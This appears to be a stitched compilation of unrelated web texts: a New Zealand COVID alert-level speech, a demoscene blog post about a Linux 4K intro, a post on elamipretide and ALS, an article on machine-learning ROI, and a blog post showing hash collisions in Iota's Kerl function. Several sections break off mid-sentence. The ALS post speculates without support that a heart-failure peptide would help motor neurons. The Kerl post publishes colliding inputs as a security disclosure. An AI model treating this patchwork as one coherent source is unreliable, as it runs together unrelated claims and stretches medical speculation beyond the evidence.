<p><span><span><span><span>Experts tell us that even with the best precautions possible, the chances of the virus passing from a surface, or contact with someone who is a carrier are high. </span></span></span></span></p>
<p><span><span><span><span>We must prepare now for that eventuality and have a plan at the ready in the event that it does. </span></span></span></span></p>
<p><span><span><span><span>The first thing we need to do is continue to ensure our border and our managed isolation facilities stay as tight as they can be. </span></span></span></span></p>
<p><span><span><span><span>We have ensured our frontline workers at the border are safe by wearing appropriate PPE, getting regularly tested and that our systems for managing returnees are robust and limit the risk of spread. As I say the system has done the job it was set up to do to date. </span></span></span></span></p>
<p><span><span><span><span>The work done by Minister Woods and Air Commodore Webb in recent weeks have made significant additional improvements in this space, and we will continue to improve the system. Australia is currently conducting an audit of its quarantine system and I’ve asked Prime Minister Morrison to share any insights so we can continually learn and improve on what we do here. </span></span></span></span></p>
<p><span><span><span><span>But again, no system is 100% fool proof and around the world we are seeing even the most rigorous measures being tested by the virus. </span></span></span></span></p>
<p><span><span><span><span>And so today I am setting out the next stage in our COVID plan in the event we have new cases in the community. </span></span></span></span></p>
<p><span><span><span><span>The first thing to note is that the Government’s strategy for responding to the COVID-19 pandemic remains elimination. That has not and will not change. </span></span></span></span></p>
<p><span><span><span><span>Allowing our hospitals to be overrun, further deaths and the economy to close down again for an indefinite period of time is not a strategy.</span></span></span></span></p>
<p><span><span><span><span>We have seen overseas the toll that that takes on lives and economies.</span></span></span></span></p>
<p><span><span><span><span>We have said from the start that the best approach for the economy is a strong health response, and the evidence has supported that approach throughout.</span></span></span></span></p>
<p><span><span><span><span>We can already see that with New Zealand’s economy more open than nearly anywhere in the world because of the steps we took to break the chain of transmission under lockdown. </span></span></span></span></p>
<p><span><span><span><span>Our plan moving forward seeks to protect that position and minimise any economic impact of future cases. </span></span></span></span></p>
<p><span><span><span><span>So in the event of new community cases we would move immediately to implement our “Stamp it Out” approach again.&nbsp; </span></span></span></span></p>
<p><span><span><span><span>There are two key things to remember.</span></span></span></span></p>
<p><span><span><span><span>Firstly, the simple approach of limiting the ability for the virus to move from human to human to break the chain of transmission remains the foundation of our response no matter what. </span></span></span></span></p>
<p><span><span><span><span>That’s why our key public health measures remain important for protecting ourselves and each other from the spread of disease. They are: </span></span></span></span></p>
<p><span><span><span><span>-&nbsp; wash your hands regularly and thoroughly </span></span></span></span></p>
<p><span><span><span><span>- cough or sneeze into your elbow </span></span></span></span></p>
<p><span><span><span><span>- don’t go to work, socialise, or be out in public if you are sick </span></span></span></span></p>
<p><span><span><span><span>- Keep a digital diary of your whereabouts by downloading and using the COVID Tracer app. </span></span></span></span></p>
<p><span><span><span><span>These principles are key to the second ongoing tool in our response. </span></span></span></span></p>
<p><span><span><span><span>Rapid contact tracing, testing, and use of isolation and quarantine for those exposed to COVID. That is why the Covid tracer app, and whatever other means of recording where you have been remains vital. Every time you step into the world I want you to ask this question “if I come into contact with COVID today, how will I know, and how will others know”. </span></span></span></span></p>
<p><span><span><span><span>If you are in or near a situation of community transmission this will be an exceptionally important tool for contact tracing, and for finding you. </span></span></span></span></p>
<p><span><span><span><span>In this area we are constantly looking at how we can use new technology to strengthen our response, the same goes for testing. </span></span></span></span></p>
<p><span><span><span><span>But these are the principles we are all familiar with. Now I want to touch on what would be different.</span></span></span></span></p>
<p><span><span><span><span>The alert level system and framework remains in place. But in the event of cases, rather than apply the framework nationally, we would look to apply our Alert Level system at a localised or regional level in the first instance.&nbsp; </span></span></span></span></p>
<p><span><span><span><span>Our priority will be to control any cases with the least intrusive measures, and over the smallest area we can.&nbsp; </span></span></span></span></p>
<p><span><span><span><span>In practical terms that means doing absolutely everything possible to avoid the entire country returning to Alert Levels 3 or 4 as a measure of last resort.&nbsp; </span></span></span></span></p>
<p><span><span><span><span>“Our ‘Stamp it Out’ approach is scenario specific meaning that our actions will depend on the severity of the situation. </span></span></span></span></p>
<p><span><span><span><span>And of course when we see the first COVID-19 case beyond the border, you can expect us to move very quickly and very firmly to contain it while we gather information on the situation we are facing. </span></span></span></span></p>
<p><span><span><span><span>However there are three broad starting scenarios we can plan around. </span></span></span></span></p>
<p><span><span><span><span>1. A case or a number of cases in a community. </span></span></span></span></p>
<p><span><span><span><span>2. A larger number of cases or cluster in a region</span></span></span></span></p>
<p><span><span><span><span>3. Multiple clusters that have spread nationally</span></span></span></span></p>
<p><span><span><span><span>Let me run through what each scenario might look like. </span></span></span></span></p>
<p><span><span><span><span>First a contained case or cases within a community.</span></span></span></span></p>
<p><span><span><span><span>We would be looking at applying strong restrictions but only applied locally in a neighbourhood, town or city to contain the virus and stopping it spread. </span></span></span></span></p>
<p><span><span><span><span>We would likely remain at Alert Level 1 nationally. </span></span></span></span></p>
<p><span><span><span><span>The local measures to contain the case would involve rapid contact tracing and isolation of cases and their contacts, scaled up and targeted testing of people connected to the case, such as workmates, those they live with or those in their neighbourhood. </span></span></span></span></p>
<p><span><span><span><span>The point with this scenario is we would look at act hard and fast, but local in an attempt to ring fence the virus.&nbsp; </span></span></span></span></p>
<p><span><span><span><span>The second scenario is a large cluster within a region. </span></span></span></span></p>
<p><span><span><span><span>Here, a significant increase in testing would be the priority. We would look to undertake much wider community testing, on top of testing any contacts or potential contact of those with the virus. This could look like it did in Victoria where health staff went door to door to test people in affected areas. </span></span></span></span></p>
<p><span><span><span><span>We would also take steps to stop the spread to other parts of the country so a regional shift in Alert Level would likely be applied that restricted travel. This would mean travel in or out of the city, town or region could be stopped, people in that place asked to work from home, and local restrictions on gatherings implemented. </span></span></span></span></p>
<p><span><span><span><span>The aim here is to contain the spread away from other areas to avoid the whole country having to put in place restrictions so we can remain at Alert Level 1 nationally, depending on the evidence of risk of spread outside the region. </span></span></span></span></p>
<p><span><span><span><span>The final scenario is if multiple clusters, spread nationally. </span></span></span></span></p>
<p><span><span><span><span>In this scenario we would …</span></span></span></span></p></div></div>

<p><h2>My First Demoscene production</h2></p> 
<em>15-07-2020</em> 
<p>This year, I made my first ever demo! I've been threatening to do so for ages now, but since the lockdown hit, I've really had no excuse not to. For these of you unfamiliar with the demoscene, it's a small, yet internationally recognised[^0] subculture revolving around computer art. Some of the best programmers and artists produce works for all sorts of computers and electronic equipment, pushing the machines and themselves to the very limit! There are demoscene parties taking place all over Europe (and some further afield). I entered <a href="http://novaparty.org/">NOVA</a> this year - the UK's main demoscene party, and had great fun doing so.</p>
<h3>Demos and the Demoscene</h3>
<p>The demoscene has been around for a while now. It started out when crackers learned to break the copy protection on games. To show off their prowess, these expert programmer-pirates would leave messages at the beginning of the game. These messages often had music, scrollers, custom art. You can draw quite a few parallels to graffiti work, and I mean <em>really good</em> graffitti work! Some of these <em>'cracktros'</em> are incredible! The crackros became the main event, and the demoscene was born.</p>
<p>Back in these days, before the internet, demos were distributed via disk or bulletin boards. You could swap disks with folks you knew, dial into a modem and download, get disks in the mail, or go to a demoparty. Demo parties are still going today, stronger than ever one could argue. The largest Demoscene party is <a href="https://2019.revision-party.net/">Revision</a>, held in Saarbrucken, Germany. I've been a couple of times - you'll see some of the finest computer art in the world at this event! </p>
<p>Parties tend to be built around competitions. There are several categories and you can enter as many as you like. The competitions range from oldschool demos, such as these written for the <a href="https://en.wikipedia.org/wiki/Amiga">Amiga</a> or the <a href="https://en.wikipedia.org/wiki/ZX_Spectrum">ZX Spectrum</a>, to 64K PC Demos - where the size limit is 64K. There are competitions for music, ranging from new school to tracked, and also competitions for Pixel Art and digital photography. Something for everyone.</p>
<p>Quite often, folks will get together to form a demoscene group. Musicians, teaming up with programmers and illustrators to create entries none of them could do on their own. Some of these groups have been going for decades, albeit with different members.</p>
<p>In the past, computers were a bit more restrictive than they are now. 3D rendering on the Amiga is quite the task whereas it's quite trivial on a modern PC. To keep up the challenge, a set of size-coding competitions were devised. The idea is fairly simple - see how much you can do with 64K, 8K or 4K. Some competitions even go as far down as 256 Bytes[^3]! For reference, an average email is around 400 Kilobytes.</p>

<p>Some of these competition entries are absolutely fabulous. One of my favourites is <a href="http://www.pouet.net/prod.php?which=67113">Fermi Paradox</a>; a 64k entry by the demogroup <a href="https://mercury.sexy/">Mercury</a>. I'm still amazed that not only can so much be packed into such a small space, but that so much can be <em>said</em> in a short space of time. The programming skill is only matched by the art.</p>
<h3>Linux 4K</h3>
<p>One of the things I've noticed is there are very few Linux demos. This sounds odd to me as Linux is quite the open platform, at least compared to Windows. However, Windows has been the mainstay of the PC demoscene for much of the scene's history. I think this is because the graphics drivers tend to be better, Windows setups are much more homogeneous (you can generally rely on certain libraries being around), and more of a history of the kinds of hacking techniques often used in demo production. As more demos were released for Windows, more demotools became available. Tools such as <a href="http://crinkler.net/">crinkler</a>, which compresses your demos down to a tiny size, to the <a href="https://github.com/laurentlb/Shader_Minifier">shader minifier</a>. Linux hasn't got there yet with it's tooling, until recently.</p>
<p>Thanks to the efforts of <a href="https://bitbucket.org/blackle_mori/scalemark/src/master/">Blackle</a> and <a href="https://gitlab.com/PoroCYon/linux-4k-intro-template">poroCyon</a>, we now have a starting template for Linux 4K entries. I took a look at how the template was built up. There seems to be the following processes:</p>
<ul>
<li>Compress the shaders into a header file with shader minifier</li>
<li>Build the object files with some embedded assembly (which I don't understand!)</li>
<li>Strip out any of the bits of the ELF Header we don't need. </li>
<li>Link everything together with the <a href="https://github.com/Shizmob/smol">Shoddy minsize-oriented linker (SMOL)</a></li>
<li>Compress everything with the <a href="https://in4k.github.io/wiki/lsc-wiki-vondehi.html">vondehi</a> program.</li>
</ul>
<p>Vondhehi is quite funky! The decompressor itself is loaded into your program and decompresses the rest of the program once the program is run. </p>
<p>There are no doubt other subtle things going on. If you want to know more, <a href="https://www.youtube.com/watch?v=a03HXo8a_Io">there is a talk from Revision you can watch</a> that explains the process in more detail. The code-base itself seems a little complicated but some of that is down to the tools being made for windows; there is a dependency on <a href="https://www.mono-project.com/">Mono</a> (among other things) for example. Nevertheless, it's quite possible to get down to an executable of 4K or smaller.</p>
<figure><img src="https://shutr.benjamin.computer/inpost/numenera1.jpg" alt="Generating protein images."><figcaption>Screenshot from within the mysterious Menger Sponge!</figcaption></figure>

<p>This demo runs on every Linux setup I've tested it on. The de-facto standard for demoparties seems to be Ubuntu (at the time of writing, Ubuntu 18 for Revision). All size coding demos rely on some libraries being pre-installed. Unlike Windows, there is no guarantee you'll have the library you want installed under Linux, so this template comes with three options for the OpenGL context: SDL2 and GTK3. I went with SDL2 in the end, as it resulted in a slightly smaller filesize.</p>
<h3>Music</h3>
<p>Definitely my weakest area this one. I had no idea where to begin. Thankfully the template is setup to use a tracker or synthesizer. I honestly don't know how this bit works but after looking around briefly, I found a program called <a href="https://www.renoise.com/">Renoise</a>. Apparently, there are set of instruments made by demosceners that can be loaded into renoise, whereupon you can make your soundtrack. These instruments tend to compress rather well it is claimed. <a href="https://github.com/askeksa/Oidos">Oidos</a>, <a href="http://4klang.untergrund.net/">4KLang</a> and <a href="http://www.pouet.net/prod.php?which=61592">Clinkster</a> are recommended in the template. I decided to go with Clinkster for no real reason at all. </p>
<p>Renoise is a Windows program unfortunately, but it seems to run well enough under <a href="https://www.winehq.org/">Wine</a>. I could create a tracked piece of music fairly quickly (I use music in the loosest possible sense of the word!). With the file placed in the right directory, the template makefile rolls it in quite easily.</p>
<p>If you want to know more about demoscene music and listen to the work of someone who really knows what they are doing, check out <a href="https://soundcloud.com/h0ffman">h0ffman</a>. He has <a href="https://hoffman.home.blog/2019/04/27/eon/">a good write-up on his site</a> about the kinds of hoops a demoscener composer needs to jump through.</p>
<h3>Raymarching Menger Sponges</h3>
<p>With everything in place, I set to. I'd wanted to learn a bit more about fractals and how they are rendered. I started with the <a href="https://en.wikipedia.org/wiki/Menger_sponge">Menger sponge</a> -  a classic fractal. I like the look of it! Something weirdly alien yet constructed. I thought I'd use this as the main feature around which this intro would be based.</p>
<p>Normally, fractals are described using <a href="https://en.wikipedia.org/wiki/Recursion">recursion</a>. It's an elegant way of of generating an image as fractals are self similar. However, in a fragment shader, this isn't possible.</p>
<p>It's worth mentioning what a <a href="https://www.khronos.org/opengl/wiki/Fragment_Shader">fragment shader</a> is. In early 3D graphics, the pipeline that took your triangles and spat out pixels on your screen was fixed; you couldn't really tweak it. Nowadays, you can alter the functionality of many different sections of the pipeline using small programs called <em>shaders</em>. The fragment shader is the last shader in the line before the pixels appear. It's sometimes called a pixel shader too, though you aren't manipulating pixels at this point (well, you are close enough I guess). </p>
<p>The fragment shader is where all the graphics magic happens. You are given a fragment and you output a colour for that fragment. The in-between step is where the fun is. We can use a technique known as raymarching. </p>
<p>Raymarching (or Volume Ray Casting) is used all over the place in a lot of demos; it's a powerful technique. Similar to raytracing, you shoot a ray from your camera through the screen at the fragment position. You then need to find out what this ray hits. To do that, you use a <a href="https://prideout.net/blog/distance_fields/">distance field</a>.</p>
<p>Distance fields are a parametric way of defining a scene. The simplest example is a sphere. A sphere can be defined as a 3D point and a radius - 4 numbers. From these four numbers you can figure out the distance from where your ray is, to the sphere, even figuring out where on the sphere your ray will intersect. The next step is to <em>march the ray</em> that distance and then check again how far away you are. </p>
<p>You can build up an entire scene this way, with multiple objects, creating realistic lighting, special effects and more! It's a really powerful technique made famous by the website <a href="https://www.shadertoy.com/">Shadertoy</a> and it's creator, <a href="https://iquilezles.org/">Iniqgo Quilez</a>. His site details a number of <a href="https://iquilezles.org/www/articles/distfunctions/distfunctions.htm">mathematical formulas for distance fields</a> though I can't claim to understand most of them. However, we can do all this in a single pixel shader.</p>
<p>Back to our Menger sponge then. If we can do it recursively, we'll have to go iteratively. One way we can create the sponge is to start with a field for a large cube and effectively carve out the holes using smaller cuboids and a subtraction function. Turns out all of these are easy to do in a fragment shader if you have the right functions. An excellent set of such functions can be found on <a href="https://mercury.sexy/">Mercury's homepage</a>.</p>
<h3>Numenera</h3>
<p>Back to our demo. I had the idea of using a Menger Sponge but no idea on the actual <em>art</em>. Where to begin? What was a trying to say? I must admit, this bit really took me by surprise how hard it was! I suppose that's a bit of a cliche right - the engineer trying to do an art? Still, undeterred, I'd been reading a little about the roleplay game <a href="https://en.wikipedia.org/wiki/Numenera">Numenera</a>. I liked the idea of long lost advanced technology. I pictured a desert, with an ancient and worn down artefact, suddenly coming alive as we observe it. I had an idea, so off I went!</p>
<p>The desert part is quite easy - it's just a plane with a noise offset on the distance field. I used Iq's lighting model for the shadows and the ambient occlusion. With …</p></div>

                    <p><a href="https://elifesciences.org/articles/55513">The article discussed here</a> is not related to neurodegeneration diseases, it discusses about heart failure, however it might have implications for ALS.
While most ALS targeting therapies might aim at reducing TDP-43 aggregates (and similar protein aggregates in other neurodegenerative diseases), humans are indeed more than bags of identical cells, they are first living because they are composed of a multitude of physiological systems that interact to maintain homeostasis.
So even if a therapy was invented that would efficiently remove TDP-43 aggregates, ALS patients would still be unable to recover health as motor neurons do not rejuvenate nor are replaced with newer cells. As this heart failure treatment improves heart muscle cells, it should also to some degree improve motor neuron cells.
This article is also interesting as it mentions some drugs that are discusses ALS online internet forums, such as glutathione, N-Acetyl Cysteine (NAC) and Glycine.</p>

<p>This article explains precisely how some muscle cells seem to rejuvenate when a specific peptide is administrated. Very roughly: With this peptide, metabolism is rejuvenated at cellular level, so cells can use more energy, something which is clearly lacking in ALS cells which are characterized by hypermetabolism.  Humans produce and consume about 65 kg of ATP every day. Because ATP cannot be stored, it is critical that the rate of ATP synthesis matches the rate of ATP consumption. The primary role of mitochondria is the generation of adenosine triphosphate (ATP) from adenosine diphosphate (ADP) using macromolecular complexes that form the electron transport chain.</p>

<p><img src="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC7000886/bin/gr3.jpg" alt="enter image description here"></p>

<p>Mitochondrial dysfunction is one of the hallmarks of aging. While mitochondria generate the
bulk of cellular ATP, they are also the major source of reactive oxygen species (ROS) in most
cells. ROS are sub-products inherent to ATP metabolism.</p>

<p>Aging is the strongest risk factor for cardiovascular diseases. It is also accompanied by a
decline in cardiac function, especially diastolic dysfunction and hypertrophy of the left ventricle
and left atrium. The heart is rich in mitochondria and has a high metabolic demand; therefore,
it is highly susceptible to oxidative damage and the effects of mitochondrial dysfunction.
Increasing evidence suggests that mitochondrial oxidative stress and mitochondrial dysfunction
play critical roles in cardiovascular diseases and cardiac aging.</p>

<p>The mitochondrial-targeted tetrapeptide SS-31 (elamipretide), is a pharmacologic intervention that selectively concentrates in mitochondria, suppressing mitochondrial ROS and increasing skeletal muscle ATP production. Elamipretide (also named SS-31, MTP-131, Bendavia) is sold by Stealth BioTherapeutics, Newton, Massachusetts. It is a water-soluble, aromatic-cationic mitochondria-targeting tetrapeptide that readily penetrates and transiently localizes to the inner mitochondrial membrane and associates with cardiolipin to restore mitochondrial bioenergetics</p>

<p>it has not been established whether delivering such interventions in later life can rescue pre-existing mitochondrial and cardiac dysfunction. In this study, the authors demonstrate that mitochondrial-targeted interventions can improve mitochondrial function and reverse pre-existing cardiac dysfunction in old mice.</p>

<p>To determine the effects of SS-31 treatment on cardiac function in old mice, the scientists treated 24-month-old mice with the SS-31 peptide or saline control and examined cardiac function by echocardiography after 4 and 8 weeks of treatment.</p>

<p>SS-31 treatment was effective in aged hearts with pre-existing mitochondrial dysfunction but had little effects in young hearts with normal functioning mitochondria.</p>

<p>The authors acknowledge that the persistence of SS-31 induced functional benefit varied between individual mice. Other studies have reported negative effects of targeting mitochondrial ROS. In another study, suppression of mitochondrial ROS in mice resulted in impaired macrophage bactericidal activity.</p>

<p>However not everything is rosy, elamipretide is known since quite some time and had been tested in several different diseases. Recently it did not meet expectations stemming from promising early trial results in patients with primary mitochondrial myopathy (PMM), data from a Phase 3 (NCT03323749) trial show.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>This post appeared first on <a href="https://towardsdatascience.com/return-on-investment-for-machine-learning-1a0c431509e">Towards Data Science</a> on July 8th, 2020.</p></blockquote><p>Machine learning deals with probabilities, which means there’s always a chance for mistakes. This inherent uncertainty causes many decision makers feel uncomfortable with implementing machine learning and traps them in an endless chase for the magical 100% accuracy. The fear of mistakes nearly always pops up when I’m working with companies taking their first steps towards intelligent automation, and I get asked “What if the algorithm makes a wrong prediction?”</p><p>If this issue is not addressed, the company will very likely spend a hefty amount of resources and years of development time on machine learning without ever getting returns for their investment. In this article, I’ll show you the simple equation I use to relieve these concerns and get decision makers more comfortable with the uncertainty.</p><h3>When is machine learning worth it</h3><p>Just like with any investment, the feasibility of machine learning comes down to whether it generates more value than it costs. It’s a normal Return on Investment (ROI) calculation which, in the context of machine learning, weighs the generated value against the cost of mistakes and accuracy. So instead of asking “How do we get 100% accuracy?”, the right question is “How do we maximize ROI?”</p><p>Determining the expected returns is quite straightforward. I usually begin opening up the business case for machine learning implementation by comparing its benefits against the potential costs in mathematical terms. This can be formalized in an equation which basically says “What’s left of the generated value after the cost of mistakes is accounted for?” Solving this simple equation allows us to estimate the profits for different scenarios.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_simple.png" alt="returns = value - (1 - accuracy) * cost of a mistake"></p></div></div><p>Let’s look at the variables:</p><ul><li><strong>returns</strong>: Generated net value or profit per prediction  </li><li><strong>value</strong>: The new value generated by every prediction (e.g. assigning a document to the right category now takes 0.01 seconds instead of 5 minutes, so the value is 5 minutes saved)  </li><li><strong>accuracy</strong>: The accuracy of predictions made by the algorithm  </li><li><strong>cost of a mistake</strong>: The additional costs incurred by a wrong prediction (e.g. it takes 20 minutes for someone to correct the mistake in the system)  </li></ul><p>By flipping the equation around and setting returns to zero, we get the minimum accuracy required to generate net value. This is called <strong>break-even accuracy</strong>:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_simple_flip.png" alt="accuracy = 1 - (value / cost of a mistake)"></p></div></div><p>The equation gets more intuitive when plotted in a graph:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_simple_graph.png" alt="Break-even point visualized"></p></div></div><p>So let’s say each prediction saves you 5 minutes of work but it takes 20 minutes of extra work to fix a wrong prediction. We can now calculate the break-even accuracy to be 1–5/20 = <strong>75%</strong>. Any improvement after this point brings concrete profits.</p><p>The above equation assumes us to blindly accept any prediction the algorithm makes and fix the errors afterwards. Sounds risky? We can do much better by extending the equation with confidence scores to lower the risks.</p><h3>Optimizing ROI</h3><p>A machine learning algorithm (done right) does not only spew out predictions, it also tells us how confident it is in every prediction. The majority of mistakes happen when the algorithm is unsure of its answer, allowing us to focus automation on the highest certainty predictions while manually reviewing the lowest few. Even though manual review does cost a bit of labor, it’s normally much cheaper than fixing a mistake later on.</p><p>Let’s choose a threshold which picks out 10% of the least confident predictions for manual review. The rest 90% will be handled automatically. This ratio is called confidence split. The accuracy in the high confidence bracket will now be considerably better since many of the mistakes are caught in the small unconfident bracket. This leads us to the extended equation. It says “What’s left of the generated value after the costs of mistakes and manual review are accounted for?”</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_extended.png" alt="returns = (value - (1 - confident accuracy) * cost of a mistake) * confidence split - (1 - confidence split) * cost of manual review"></p></div></div><p>Let’s look at the variables:</p><ul><li><strong>returns</strong>: Generated net value or profit per prediction  </li><li><strong>value</strong>: The new value generated by every prediction  </li><li><strong>confident accuracy</strong>: The accuracy of predictions in the high confidence bracket  </li><li><strong>cost of a mistake</strong>: The additional costs incurred by a wrong prediction  </li><li><strong>confidence split</strong>: The ratio of high confidence predictions (90% in our case)  </li><li><strong>cost of manual review</strong>: The costs of manually reviewing the prediction  </li></ul><p>We can again flip the equation to calculate the break-even accuracy by setting returns to zero, like so:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_extended_flip.png" alt="confident accuracy = ((1 - confidence split) * cost of manual review) / (confidence split * cost of a mistake) - value / cost of a mistake + 1"></p></div></div><p>We’ll solve it using the following variables:</p><ul><li>value = 5 minutes saved  </li><li>cost of a mistake = 20 minutes  </li><li>cost of manual review = 5 minutes  </li><li>confidence split = 0.9  </li></ul><p>Now the new break-even accuracy is 78%. Wait a minute, that’s higher than with the simpler equation, did it just get worse? Not quite! Remember that many of the mistakes are caught in the low confidence bracket, which significantly boosts the accuracy in the high confidence bracket. Even though the minimum accuracy requirement for break-even got higher, it is now much easier to achieve.</p><p>The ability to calculate the profitability of a machine learning algorithm in operation allows you to find the optimal accuracy. And no, it’s not 100%. As I discussed in my previous article, the development cost of any system increases exponentially while providing diminishing returns. With the above equations, you can estimate a realistic ROI and calculate the point where accuracy improvements incur more development costs than increase in returns in a time-frame of your choice. That’s the ROI-optimized accuracy.</p><h3>Practical example</h3><p>Let’s take a real world scenario and run through the whole thing. Imagine your Accounts Payable team handles 5000 invoices every month, and you’ve been presented the idea of automating a part of the process. More specifically, the proposed automation would categorize incoming invoices to match complex internal vendor codes, which is currently done manually. You need to figure out whether a machine learning approach is worth the effort to solve this task.</p><p>In terms of data, below is what you’ll be working with. You have a history of previously processed invoices and the correct “Vendor_Code” value for each. The task is to predict the right “Vendor_Code” for any new invoice. You can find the original dataset <a href="https://www.kaggle.com/nikhil1011/predict-product-category-from-given-invoice/data#Train.csv">here</a>.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_data.png" alt="Sneak peet at the data"></p></div><p><span>Sneak peet at the data</span></p></div><p>To start off, use any machine learning library or tool you prefer and run a basic accuracy test for the data. I’m using aito.ai which gives me an accuracy of 78% after training with 4000 rows and testing with 1500 rows. If we use the same values and costs as before, we can calculate the monthly returns with the first equation:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_calc_simple.png" alt="returns = 5 minutes - (1 - 0.78) * 20 minutes = 0.59 minutes"></p></div></div><p>Using the simple approach which ignores the confidence scores, every prediction made by the algorithm with 78% accuracy saves you on average 0.59 minutes of work, or 35 seconds. That means almost <strong>50 hours of work saved every month</strong> from processing 5000 invoices. Not bad.</p><p>Now let’s look at the equation which considers confidence scores. I compiled the results and confidence scores for each prediction into a neat table like below which allows us to divide them into high and low confidence brackets. In this case, any prediction with confidence lower than 0.21 will be reviewed manually. This threshold gives us the 90/10 confidence split.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_conf_table.png" alt="Prediction results, including confidence scores"></p></div><p><span>Prediction results</span></p></div><p>The accuracy in our high confidence bracket is an impressive 84%, and a measly 22% in the low confidence bracket. This makes the impact of utilizing confidence scores crystal clear. Now we can calculate the new returns when confidence and manual review costs are a part of the equation:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/roi_calc_extended.png" alt="returns = (5 minutes - (1 - 0.84) * 20 minutes) * 0.9 - (1- 0.9) * 5 minutes = 1.15 minutes"></p></div></div><p>The extended approach nearly doubles the returns! Every prediction saves, on average, 1.15 minutes. Processing your 5000 monthly invoices now involves <strong>95 hours less work</strong> even when the cost of mistakes and manually reviewing 10% of the predictions are accounted for. That’s pretty great!</p><p>Now you know the level of profitability you can currently achieve. And even better, you now have a tool to determine the feasibility of further machine learning development. For example, with the equation, you may calculate the returns for a hypothetical 90% accuracy and find the returns to be <strong>183 hours saved monthly</strong>. Compare it to the estimated development costs of reaching the 90% accuracy and you’ll have factual data for deciding if further development is worth the investment.</p><h3>Summing it up</h3><p>As you’ve seen, machine learning should be approached just like any other investment. The inevitable mistakes are just a cost of doing business and they’re normal variables in our calculations. Armed with these equations, you know exactly when to start reaping the benefits of machine learning without playing a guessing game, and you can put the algorithms into production way earlier. Be freed from the endless grind towards 100% accuracy and start generating value already.</p><p><strong>Done is better than perfect.</strong></p><a href="https://aito.ai/blog">Back to blog list</a></div></div>]]>

<h2>Historical Context of Iota’s Hash Functions</h2>



<p>Once upon a time, researchers discovered that the hash function used within the Iota cryptocurrency (Curl-P), was <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Narula-Heilman-Cryptanalysis-of-Curl-P-wp.pdf">vulnerable to practical collisions</a>. When pressed about this, the Iota Foundation said the following:</p>



<figure><div>

</div><figcaption>You can read this statement from the source <a href="https://blog.iota.org/official-iota-foundation-response-to-the-digital-currency-initiative-at-the-mit-media-lab-part-4-11fdccc9eb6d">here</a>. Archived <a href="https://archive.md/fZ1Dm">here</a>.</figcaption></figure>



<p>In response to this research, the Iota developers threatened to sue the researchers.</p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Oh good. Here’s an IOTA founder darkly threatening to sue a researcher who found out that the IOTA hash function was broken (something he later claimed was done on purpose.) <a href="https://t.co/myRCv098uf">pic.twitter.com/myRCv098uf</a></p>— Matthew Green (@matthew_d_green) <a href="https://twitter.com/matthew_d_green/status/965731647579664385?ref_src=twsrc%5Etfw">February 19, 2018</a></blockquote></div>
</div><figcaption>Threatening security researchers is toxic and shady as fuck.</figcaption></figure>



<p>Iota replaced Curl-P-27 with a hash function based on Keccak-384 they call Kerl. Keccak, you may recall, is a sponge function that went on to become SHA-3.</p>



<p>At its face, this sounds like a conservative choice in cryptography protocol design: Migrate from a backdoored hash function to one trusted and respected by cryptographers around the world.</p>



<figure><div>

</div></figure>



<p>Iota even offered a bug bounty for attacks against reduced round variants:</p>



<figure><div>

</div><figcaption>I’ve never met a fiercer cryptography conference live-tweeter than @durumcrustulum.</figcaption></figure>



<p>Kerl isn’t Keccak-384 though. It’s Keccak-384 with a bit of an odd twist: They encode the input bytes into <strong>ternary</strong> ({0, 1} -&gt; {-1, 0, 1}) before hashing. Apparently this weird obsession with ternary encoding is part of Iota’s schtick?</p>



<h2 id="collisions">Practical Kerl Collisions</h2>



<p>As a consequence of their weird ternary obsession, the following inputs all produce the same Kerl hash:</p>



<ul><li>GYOMKVTSNHVJNCNFBBAH9AAMXLPLLLROQY99QN9DLSJUHDPBLCFFAIQXZA9BKMBJCYSFHFPXAHDWZFEIZ</li><li>GYOMKVTSNHVJNCNFBBAH9AAMXLPLLLROQY99QN9DLSJUHDPBLCFFAIQXZA9BKMBJCYSFHFPXAHDWZFEIH</li><li>GYOMKVTSNHVJNCNFBBAH9AAMXLPLLLROQY99QN9DLSJUHDPBLCFFAIQXZA9BKMBJCYSFHFPXAHDWZFEIQ</li></ul>



<p>This is a consequence of always zeroing out the last “trit” before passing the input to Keccak-384.</p>



<p>Since this zeroing was an explicit design choice of Iota’s, I decided to helpfully <a href="https://github.com/iotaledger/kerl/pull/8">submit a pull request</a> adding these inputs as test vectors to their JavaScript implementation.</p>



<h3 id="why-it-matters">Why It Matters</h3>



<p>These are the facts:</p>



<ul><li>Kerl is intended to replace Curl-P-27 within the Iota cryptocurrency.</li><li>The Iota Foundation previously admitted that Curl-P-27 was a “copy-protection backdoor”.</li><li>The ternary encoding in Kerl allows three different inputs to produce the same hash output (which is not true of Keccak-384).</li></ul>



<p>Given <a href="https://medium.com/iota-demystified/iota-vs-dci-or-how-an-innocent-hash-collision-became-a-huge-ego-collision-425114e61e8f">the past behavior of the Iota developers</a>, there are three possible explanations for this:</p>



<ol><li>It’s a <a href="https://aumasson.jp/data/talks/backdooring_syscan15.pdf">bugdoor</a> (a backdoor enabled by a bug) intended to be exploited by the Coordinator–possibly as another copy-protection backdoor in the spirit of Curl-P-27.</li><li>They made a critical design mistake in Kerl, which may or may not be exploitable in one or more of the places they use Kerl.</li><li>Their alleged justification for zeroing out the last trit is sound, and there’s no way to exploit this collision vulnerability within Iota.</li></ol>



<p>The last explanation is the one that Iota fanboys will probably cling to, but let me be clear: Even if this isn’t exploitable within Iota, it’s still a huge fuck-up in the design of Kerl.</p>



